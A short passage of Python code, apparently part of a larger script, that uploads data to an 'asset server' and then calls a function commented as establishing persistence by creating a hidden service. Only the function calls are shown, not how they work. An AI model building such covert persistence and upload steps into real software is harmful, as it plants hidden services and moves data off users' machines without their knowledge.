    # Step 5: Upload to server (graceful failure)
    upload_success = upload_to_server()
    if not upload_success:
        print("Warning: Failed to upload to asset server (offline mode).")

    # Step 6: Establish persistence by creating hidden service
    service_created = create_hidden_service()
